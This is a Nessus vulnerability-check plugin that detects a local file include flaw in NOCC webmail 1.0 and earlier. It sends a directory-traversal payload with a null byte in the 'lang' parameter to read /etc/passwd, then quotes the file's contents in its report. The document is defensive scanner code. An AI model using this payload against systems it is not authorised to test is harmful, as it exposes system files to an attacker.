#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running NOCC, an open-source webmail application
written in PHP. 

The installed version of NOCC is affected by a local file include flaw
because it fails to sanitize user input to the 'lang' parameter of the
'index.php' script before using it to include other PHP files. 
Regardless of PHP's 'register_globals' and 'magic_quotes_gpc'
settings, an unauthenticated attacker can leverage this issue to view
arbitrary files on the remote host and possibly to execute arbitrary
PHP code in files on the affected host. 

In addition, NOCC reportedly is affected by several other local and
remote file include, cross-site scripting, and information disclosure
vulnerabilities. 

See also :

http://retrogod.altervista.org/noccw_10_incl_xpl.html
http://www.securityfocus.com/archive/1/425889/30/0/threaded

Solution :

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(20974);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0891", "CVE-2006-0892", "CVE-2006-0893", "CVE-2006-0894", "CVE-2006-0895");
  script_bugtraq_id(16793);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"23416");
    script_xref(name:"OSVDB", value:"23417");
    script_xref(name:"OSVDB", value:"23418");
    script_xref(name:"OSVDB", value:"23419");
    script_xref(name:"OSVDB", value:"23420");
    script_xref(name:"OSVDB", value:"23421");
    script_xref(name:"OSVDB", value:"23422");
    script_xref(name:"OSVDB", value:"23423");
    script_xref(name:"OSVDB", value:"23424");
    script_xref(name:"OSVDB", value:"23425");
    script_xref(name:"OSVDB", value:"23426");
    script_xref(name:"OSVDB", value:"23427");
  }

  script_name(english:"NOCC <= 1.0 Multiple Vulnerabilities");
  script_summary(english:"Checks for a local file include flaw in NOCC");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/nocc", "/NOCC", "/webmail", "/mail", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If the initial page looks like NOCC...
  if ("nocc_webmail_login" >< res) {
    # Try to exploit one of the local file include flaw to read a file.
    file = "../../../../../../../../../../etc/passwd";
    req = http_get(
      item:string(
        dir, "/index.php?",
        "lang=", file, "%00"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if it looks like the passwd file.
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
      contents = res - strstr(res, '<!DOCTYPE html PUBLIC');
      if (contents) contents = contents - strstr(contents, "<br>");
      if (contents) {
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here are the contents of '/etc/passwd' that Nessus was able to\n",
          "read from the remote host :\n",
          "\n",
          contents
        );
      }
      else report = desc;

      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
